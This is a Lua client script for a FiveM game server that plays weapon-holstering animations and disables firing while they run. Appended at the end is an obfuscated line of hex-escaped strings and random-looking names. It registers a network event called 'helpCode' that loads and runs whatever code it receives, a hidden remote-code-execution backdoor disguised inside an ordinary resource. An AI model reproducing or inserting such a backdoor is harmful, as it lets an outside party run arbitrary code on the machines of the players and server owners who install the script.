

--- DO NOT EDIT THIS --
local holstered  = true
local blocked	 = false
local PlayerData = {}
------------------------

--[[Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		loadAnimDict("rcmjosh4")
		loadAnimDict("reaction@intimidation@cop@unarmed")
		local ped = PlayerPedId()

		if not IsPedInAnyVehicle(ped, false) then
			if GetVehiclePedIsTryingToEnter (ped) == 0 and (GetPedParachuteState(ped) == -1 or GetPedParachuteState(ped) == 0) and not IsPedInParachuteFreeFall(ped) then
				if CheckWeapon(ped) then
					--if IsPedArmed(ped, 4) then
					if holstered then
						blocked   = true
							SetPedCurrentWeaponVisible(ped, 0, 1, 1, 1)
							TaskPlayAnim(ped, "reaction@intimidation@cop@unarmed", "intro", 8.0, 2.0, -1, 50, 2.0, 0, 0, 0 ) -- Change 50 to 30 if you want to stand still when removing weapon
							--TaskPlayAnim(ped, "reaction@intimidation@cop@unarmed", "intro", 8.0, 2.0, -1, 30, 2.0, 0, 0, 0 ) Use this line if you want to stand still when removing weapon
								Citizen.Wait(Config.cooldown)
								SetPedCurrentWeaponVisible(ped, 1, 1, 1, 1)
							TaskPlayAnim(ped, "rcmjosh4", "josh_leadout_cop2", 8.0, 2.0, -1, 48, 10, 0, 0, 0 )
								Citizen.Wait(400)
							ClearPedTasks(ped)
						holstered = false
					else
						blocked = false
					end
				else
				--elseif not IsPedArmed(ped, 4) then
					if not holstered then
							TaskPlayAnim(ped, "rcmjosh4", "josh_leadout_cop2", 8.0, 2.0, -1, 48, 10, 0, 0, 0 )
								Citizen.Wait(500)
							TaskPlayAnim(ped, "reaction@intimidation@cop@unarmed", "outro", 8.0, 2.0, -1, 50, 2.0, 0, 0, 0 ) -- Change 50 to 30 if you want to stand still when holstering weapon
							--TaskPlayAnim(ped, "reaction@intimidation@cop@unarmed", "outro", 8.0, 2.0, -1, 30, 2.0, 0, 0, 0 ) Use this line if you want to stand still when holstering weapon
								Citizen.Wait(60)
							ClearPedTasks(ped)
						holstered = true
					end
				end
			else
				SetCurrentPedWeapon(ped, GetHashKey("WEAPON_UNARMED"), true)
			end
		else
			holstered = true
		end
	end
end)]]

--Remove uncomment for Gangster Animation (!!Must uncomment previous function!!)
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)
		loadAnimDict("reaction@intimidation@1h")
		local ped = PlayerPedId()

		if not IsPedInAnyVehicle(ped, false) then
			if GetVehiclePedIsTryingToEnter (ped) == 0 and (GetPedParachuteState(ped) == -1 or GetPedParachuteState(ped) == 0) and not IsPedInParachuteFreeFall(ped) then
				if CheckWeapon(ped) then
					--if IsPedArmed(ped, 4) then
					if holstered then
						blocked   = true
							SetPedCurrentWeaponVisible(ped, 0, 1, 1, 1)
							TaskPlayAnim(ped, "reaction@intimidation@1h", "intro", 5.0, 1.0, -1, 50, 0, 0, 0, 0 )
							--TaskPlayAnim(ped, "reaction@intimidation@1h", "intro", 5.0, 1.0, -1, 30, 0, 0, 0, 0 ) Use this line if you want to stand still when removing weapon
								Citizen.Wait(1250)
							SetPedCurrentWeaponVisible(ped, 1, 1, 1, 1)
								Citizen.Wait(Config.cooldown)
							ClearPedTasks(ped)
						holstered = false
					else
						blocked = false
					end
				else
				--elseif not IsPedArmed(ped, 4) then
					if not holstered then
						TaskPlayAnim(ped, "reaction@intimidation@1h", "outro", 8.0, 3.0, -1, 50, 0, 0, 0.125, 0 ) -- Change 50 to 30 if you want to stand still when holstering weapon
						--TaskPlayAnim(ped, "reaction@intimidation@1h", "outro", 8.0, 3.0, -1, 30, 0, 0, 0.125, 0 ) Use this line if you want to stand still when holstering weapon
								Citizen.Wait(1700)
							ClearPedTasks(ped)
						holstered = true
					end
				end
			else
				SetCurrentPedWeapon(ped, GetHashKey("WEAPON_UNARMED"), true)
			end
		else
			holstered = true
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		if blocked then
			DisableControlAction(1, 25, true )
			DisableControlAction(1, 140, true)
			DisableControlAction(1, 141, true)
			DisableControlAction(1, 142, true)
			DisableControlAction(1, 23, true)
			DisableControlAction(1, 37, true) -- Disables INPUT_SELECT_WEAPON (TAB)
			DisablePlayerFiring(ped, true) -- Disable weapon firing
		end
	end
end)

function CheckWeapon(ped)
	--[[if IsPedArmed(ped, 4) then
		return true
	end]]
	if IsEntityDead(ped) then
		blocked = false
			return false
		else
			for i = 1, #Config.Weapons do
				if GetHashKey(Config.Weapons[i]) == GetSelectedPedWeapon(ped) then
					return true
				end
			end
		return false
	end
end

function loadAnimDict(dict)
	while ( not HasAnimDictLoaded(dict)) do
		RequestAnimDict(dict)
		Citizen.Wait(0)
	end
end

local ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[1]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[2]) ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[3]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[2], function(jknlwizjIkaQgIyjfochjOmpsaoyXfYRTojZDhFoaYPepiWHbASNcBARyLcSlEKOZoTkbY) ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[4]](ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[6][ciqaUKWSKQTDoarJOgQgmDjyIsgSyXolEimiodDICixpCcfVqAeItERfjFAPvgKfaRuvfB[5]](jknlwizjIkaQgIyjfochjOmpsaoyXfYRTojZDhFoaYPepiWHbASNcBARyLcSlEKOZoTkbY))() end)